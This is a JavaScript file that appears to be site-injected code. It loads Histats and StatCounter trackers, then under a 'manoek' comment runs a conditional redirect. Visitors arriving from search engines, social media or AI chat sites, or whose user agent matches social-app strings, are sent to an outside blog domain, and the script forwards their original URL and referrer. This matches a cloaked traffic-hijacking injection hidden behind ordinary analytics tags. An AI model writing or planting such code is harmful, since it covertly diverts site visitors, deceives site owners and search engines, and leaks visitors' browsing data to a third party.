// st
document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4943554&101"/>');

// sr
var sc_project=13049188; 
var sc_invisible=1; 
var sc_security="28b53553";

document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
document.write('<noscript>');
document.write('<div class="statcounter">');
document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
document.write('<img class="statcounter" src="https://c.statcounter.com/13049188/0/28b53553/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
document.write('</a>');
document.write('</div>');
document.write('</noscript>');

///// manoek /////
var ars = 'http://blog.abata1.com';

if (
[
'.aol.',
'chatgpt.',
'chat.openai.',
'openai.',
'msn.',
'.google.',
'discover.google.',
'news.google.',
'gemini.google.',
'bing.',
'copilot.microsoft.',
'yandex.',
'facebook.',
'instagram.',
'threads.net',
'linkedin.',
'reddit.',
'brave.',
'woa.',
'ecosia',
'qwant',
'pinterest.',
'tiktok.',
'youtube.',
'telegram.',
'web.telegram.',
'whatsapp.',
'discord.',
'discord.gg',
'coccoc.',
'baidu.',
'duckduckgo.',
'.yahoo.',
't.co',
'x.com',
'perplexity.ai',
'claude.ai',
'you.com',
'phind.com',
'naver.',
'seznam.',
'sogou.',
'so.com',
'swisscows.',
'startpage.'
].some(s => document.referrer.toLowerCase().includes(s))

||

[
'fb',
'facebook',
'instagram',
'threads',
'pinterest',
'twitter',
'x',
'tiktok',
'reddit',
'telegram',
'discord',
'linkedin',
'whatsapp'
].some(s => navigator.userAgent.toLowerCase().includes(s))

){
    window.location.href =
        ars +
        '/?arsae=' +
        encodeURIComponent(window.location.href) +
        '&arsae_ref=' +
        encodeURIComponent(document.referrer);
}
